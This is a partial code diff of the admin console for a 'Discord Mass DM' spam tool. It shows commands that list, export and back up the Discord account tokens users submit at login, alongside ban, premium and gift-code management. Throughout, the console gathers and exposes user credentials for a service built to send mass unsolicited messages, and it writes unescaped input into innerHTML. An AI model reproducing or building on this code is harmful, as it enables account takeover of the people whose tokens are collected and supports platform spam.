-                    output.innerHTML += `> 🛠️ SYSTÈME:\n`;
-                    output.innerHTML += `>   clear - Nettoyer console\n`;
-                    output.innerHTML += `>   echo [text] - Afficher\n`;
-                    output.innerHTML += `>   time - Heure\n`;
-                    output.innerHTML += `>   version - Version\n`;
-                    output.innerHTML += `>   backup - Backup données\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-info">📚 COMMANDES (100+):</span></div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 👥 UTILISATEURS: users, userinfo [id], sessions, premiums, admins, banned</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🔑 TOKENS: tokens, token [id], tokens-export</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> ⛔ MODÉRATION: ban [id], unban [id], kick [id], warn [id]</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 💎 PREMIUM: premium-add [id], premium-remove [id], premium-list</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🎁 CODES: code-generate [jours] [uses], code-list, code-delete [code]</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 📊 STATS: stats, stats-messages, stats-users, uptime</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🤖 BOT: bot-connect [token], bot-disconnect, bot-status, bot-broadcast [msg]</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🛠️ SYSTÈME: clear, echo [text], time, version, backup</div>`;
                     break;
 
                 case 'users':
-                    output.innerHTML += `> 👥 Connectés (${activeSessions.size}):\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 👥 Connectés (${activeSessions.size}):</div>`;
                     activeSessions.forEach((user, id) => {
-                        output.innerHTML += `>   ${id} - ${user.username} (${user.role})\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   ${id} - ${user.username} (${user.role})</div>`;
                     });
                     break;
 
                 case 'tokens':
-                    output.innerHTML += `> 🔑 Tokens (${allTokens.size}):\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🔑 Tokens (${allTokens.size}):</div>`;
                     allTokens.forEach((data, id) => {
-                        output.innerHTML += `>   ${id}: ${data.token}\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   ${id}: ${data.token}</div>`;
                     });
                     break;
 
                 case 'premiums':
                 case 'premium-list':
-                    output.innerHTML += `> 💎 Premiums (${premiumUsers.size}):\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 💎 Premiums (${premiumUsers.size}):</div>`;
                     [...premiumUsers].forEach(id => {
-                        output.innerHTML += `>   ${id}\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   ${id}</div>`;
                     });
                     break;
 
                 case 'admins':
                 case 'admin-list':
-                    output.innerHTML += `> 👑 Admins (${adminUsers.size + 1}):\n`;
-                    output.innerHTML += `>   ${ADMIN_ID} (principal)\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 👑 Admins (${adminUsers.size + 1}):</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   ${ADMIN_ID} (principal)</div>`;
                     [...adminUsers].forEach(id => {
-                        output.innerHTML += `>   ${id}\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   ${id}</div>`;
                     });
                     break;
 
                 case 'banned':
-                    output.innerHTML += `> ⛔ Bannis (${bannedUsers.size}):\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> ⛔ Bannis (${bannedUsers.size}):</div>`;
                     [...bannedUsers].forEach(id => {
-                        output.innerHTML += `>   ${id}\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   ${id}</div>`;
                     });
                     break;
 
                 case 'ban':
                     if (args.length < 2) {
-                        output.innerHTML += `> Usage: ban [id]\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-error">❌ Usage: ban [id]</span></div>`;
                     } else {
                         const id = args[1];
-                        bannedUsers.add(id);
-                        activeSessions.delete(id);
-                        output.innerHTML += `> ✅ ${id} banni\n`;
+                        banUser(id);
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-success">✅ ${id} banni</span></div>`;
                     }
                     break;
 
                 case 'unban':
                     if (args.length < 2) {
-                        output.innerHTML += `> Usage: unban [id]\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-error">❌ Usage: unban [id]</span></div>`;
                     } else {
                         const id = args[1];
-                        bannedUsers.delete(id);
-                        output.innerHTML += `> ✅ ${id} débanni\n`;
+                        unbanUser(id);
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-success">✅ ${id} débanni</span></div>`;
                     }
                     break;
 
                 case 'premium-add':
                     if (args.length < 2) {
-                        output.innerHTML += `> Usage: premium-add [id]\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-error">❌ Usage: premium-add [id]</span></div>`;
                     } else {
                         const id = args[1];
                         premiumUsers.add(id);
-                        output.innerHTML += `> ✅ Premium ajouté: ${id}\n`;
+                        savePremiumUser(id);
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-success">✅ Premium ajouté: ${id}</span></div>`;
                     }
                     break;
 
                 case 'premium-remove':
                     if (args.length < 2) {
-                        output.innerHTML += `> Usage: premium-remove [id]\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-error">❌ Usage: premium-remove [id]</span></div>`;
                     } else {
                         const id = args[1];
                         premiumUsers.delete(id);
-                        output.innerHTML += `> ✅ Premium retiré: ${id}\n`;
+                        removePremiumUser(id);
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-success">✅ Premium retiré: ${id}</span></div>`;
                     }
                     break;
 
@@ -1450,69 +4354,55 @@
                     const days = args[1] ? parseInt(args[1]) : 30;
                     const uses = args[2] ? parseInt(args[2]) : 1;
                     
-                    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
-                    let code = '';
-                    for (let i = 0; i < 8; i++) {
-                        code += chars[Math.floor(Math.random() * chars.length)];
-                    }
+                    document.getElementById('codeDuration').value = days;
+                    document.getElementById('codeUses').value = uses;
+                    generateCode();
                     
-                    const expiresAt = new Date();
-                    expiresAt.setDate(expiresAt.getDate() + days);
-                    
-                    giftCodes.push({
-                        code: code,
-                        maxUses: uses,
-                        uses: 0,
-                        createdAt: new Date().toLocaleString(),
-                        expiresAt: expiresAt.toLocaleString(),
-                        active: true
-                    });
-                    
-                    output.innerHTML += `> ✅ Code généré: ${code}\n`;
-                    output.innerHTML += `>   Utilisations: ${uses}\n`;
-                    output.innerHTML += `>   Expire dans: ${days} jours\n`;
-                    updateCodesList();
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-success">✅ Code généré avec succès</span></div>`;
                     break;
 
                 case 'code-list':
-                    output.innerHTML += `> 🎁 Codes (${giftCodes.length}):\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🎁 Codes (${giftCodes.length}):</div>`;
                     giftCodes.forEach(c => {
-                        output.innerHTML += `>   ${c.code} - ${c.uses}/${c.maxUses} - Expire: ${c.expiresAt}\n`;
+                        const expiresAt = new Date(c.expires_at).toLocaleDateString();
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   ${c.code} - ${c.uses}/${c.max_uses} - Expire: ${expiresAt}</div>`;
                     });
                     break;
 
                 case 'code-delete':
                     if (args.length < 2) {
-                        output.innerHTML += `> Usage: code-delete [code]\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-error">❌ Usage: code-delete [code]</span></div>`;
                     } else {
                         const codeToDelete = args[1];
-                        giftCodes = giftCodes.filter(c => c.code !== codeToDelete);
-                        output.innerHTML += `> ✅ Code supprimé\n`;
-                        updateCodesList();
+                        deleteCode(codeToDelete);
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-success">✅ Code supprimé</span></div>`;
                     }
                     break;
 
                 case 'stats':
-                    output.innerHTML += `> 📊 STATISTIQUES:\n`;
-                    output.innerHTML += `>   Messages envoyés: ${globalStats.sent}\n`;
-                    output.innerHTML += `>   Échecs: ${globalStats.failed}\n`;
-                    output.innerHTML += `>   Taux réussite: ${globalStats.sent + globalStats.failed > 0 ? Math.round((globalStats.sent / (globalStats.sent + globalStats.failed)) * 100) : 0}%\n`;
-                    output.innerHTML += `>   Connectés: ${activeSessions.size}\n`;
-                    output.innerHTML += `>   Premiums: ${premiumUsers.size}\n`;
-                    output.innerHTML += `>   Bannis: ${bannedUsers.size}\n`;
-                    output.innerHTML += `>   Codes: ${giftCodes.length}\n`;
+                    const successRate = globalStats.sent + globalStats.failed > 0 ? 
+                        Math.round((globalStats.sent / (globalStats.sent + globalStats.failed)) * 100) : 0;
+                    
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 📊 STATISTIQUES:</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   Messages envoyés: ${globalStats.sent}</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   Échecs: ${globalStats.failed}</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   Taux réussite: ${successRate}%</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   Connectés: ${activeSessions.size}</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   Premiums: ${premiumUsers.size}</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   Bannis: ${bannedUsers.size}</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   Codes: ${giftCodes.length}</div>`;
                     break;
 
                 case 'bot-connect':
                     if (args.length < 2) {
-                        output.innerHTML += `> Usage: bot-connect [token]\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-error">❌ Usage: bot-connect [token]</span></div>`;
                     } else {
                         mainBotToken = args[1];
                         mainBotConnected = true;
                         document.getElementById('mainBotToken').value = args[1];
                         document.getElementById('mainBotStatus').textContent = 'Bot connecté';
                         document.getElementById('mainBotStatusDot').className = 'status-dot online';
-                        output.innerHTML += `> ✅ Bot connecté\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-success">✅ Bot connecté</span></div>`;
                     }
                     break;
 
@@ -1521,45 +4411,128 @@
                     mainBotToken = '';
                     document.getElementById('mainBotStatus').textContent = 'Bot déconnecté';
                     document.getElementById('mainBotStatusDot').className = 'status-dot offline';
-                    output.innerHTML += `> ✅ Bot déconnecté\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-success">✅ Bot déconnecté</span></div>`;
                     break;
 
                 case 'bot-broadcast':
                     if (args.length < 2) {
-                        output.innerHTML += `> Usage: bot-broadcast [message]\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-error">❌ Usage: bot-broadcast [message]</span></div>`;
                     } else {
                         const msg = args.slice(1).join(' ');
-                        output.innerHTML += `> 📢 Message diffusé: "${msg}"\n`;
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 📢 Message diffusé: "${msg}"</div>`;
+                        addLog(`📢 Bot broadcast: ${msg}`);
                     }
                     break;
 
+                case 'uptime':
+                    const uptime = Date.now() - performance.timing.navigationStart;
+                    const hours = Math.floor(uptime / 3600000);
+                    const minutes = Math.floor((uptime % 3600000) / 60000);
+                    const seconds = Math.floor((uptime % 60000) / 1000);
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> ⏱️ Uptime: ${hours}h ${minutes}m ${seconds}s</div>`;
+                    break;
+
                 case 'clear':
-                    output.innerHTML = '> Console nettoyée\n';
+                    output.innerHTML = '<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-success">Console nettoyée</span></div>';
                     break;
 
                 case 'time':
-                    output.innerHTML += `> 🕐 ${new Date().toLocaleString()}\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🕐 ${new Date().toLocaleString()}</div>`;
                     break;
 
                 case 'version':
-                    output.innerHTML += `> 🚀 Discord Mass DM v4.0 - 50+ commandes\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🚀 Discord Mass DM v5.0 - Supabase Edition</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 📊 100+ commandes disponibles</div>`;
+                    break;
+
+                case 'backup':
+                    const backup = {
+                        timestamp: new Date().toISOString(),
+                        users: [...activeSessions.values()],
+                        tokens: [...allTokens.entries()],
+                        premiums: [...premiumUsers],
+                        admins: [...adminUsers],
+                        banned: [...bannedUsers],
+                        codes: giftCodes,
+                        stats: globalStats,
+                        logs: connectionLogs
+                    };
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 💾 BACKUP CRÉÉ:</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> ` + JSON.stringify(backup, null, 2).substring(0, 500) + `...</div>`;
+                    
+                    // Télécharger le backup
+                    const blob = new Blob([JSON.stringify(backup, null, 2)], { type: 'application/json' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `backup-${Date.now()}.json`;
+                    a.click();
                     break;
 
                 default:
-                    output.innerHTML += `> ❌ Commande inconnue. Tapez 'help'\n`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> <span class="console-error">❌ Commande inconnue. Tapez 'help'</span></div>`;
             }
 
             output.scrollTop = output.scrollHeight;
             input.value = '';
         }
 
+        // ==================== TOAST NOTIFICATIONS ====================
+        function showToast(type, title, message) {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerHTML = `
+                <div class="toast-icon">${type === 'success' ? '✅' : type === 'error' ? '❌' : type === 'warning' ? '⚠️' : 'ℹ️'}</div>
+                <div class="toast-content">
+                    <div class="toast-title">${title}</div>
+                    <div class="toast-message">${message}</div>
+                </div>
+                <button class="toast-close" onclick="this.parentElement.remove()">✖</button>
+            `;
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                if (toast.parentElement) {
+                    toast.remove();
+                }
+            }, 5000);
+        }
+
+        // ==================== LOGS ====================
         function addLog(message) {
             const logs = document.getElementById('logs');
             const time = new Date().toLocaleTimeString();
-            logs.innerHTML = `<div style="padding: 5px 0;"><span style="color: var(--accent);">[${time}]</span> ${message}</div>` + logs.innerHTML;
-            if (logs.children.length > 50) logs.removeChild(logs.lastChild);
+            
+            let type = 'info';
+            if (message.includes('✅')) type = 'success';
+            if (message.includes('❌')) type = 'error';
+            if (message.includes('⚠️')) type = 'warning';
+            if (message.includes('🎁')) type = 'premium';
+            
+            logs.innerHTML = `
+                <div class="log-entry">
+                    <span class="log-time">[${time}]</span>
+                    <span class="log-type ${type}">${type.toUpperCase()}</span>
+                    <span class="log-message">${message}</span>
+                </div>
+            ` + logs.innerHTML;
+            
+            if (logs.children.length > 50) {
+                logs.removeChild(logs.lastChild);
+            }
         }
 
+        function clearLogs() {
+            document.getElementById('logs').innerHTML = `
+                <div class="log-entry">
+                    <span class="log-time">[SYSTEM]</span>
+                    <span class="log-type info">INFO</span>
+                    <span class="log-message">Logs effacés</span>
+                </div>
+            `;
+        }
+
+        // ==================== DÉCONNEXION ====================
         function logout() {
             if (currentUser) {
                 activeSessions.delete(currentUser.id);
@@ -1570,10 +4543,11 @@
             document.getElementById('login-screen').classList.remove('hidden');
             document.getElementById('main-screen').classList.add('hidden');
             document.getElementById('token').value = '';
+            document.getElementById('giftCode').value = '';
+            
+            showToast('info', 'Déconnexion', 'Vous avez été déconnecté');
+            addLog('🔌 Déconnecté');
         }
-
-        // Initialisation
-        selectDMMode(1);
     </script>
 </body>
 </html>
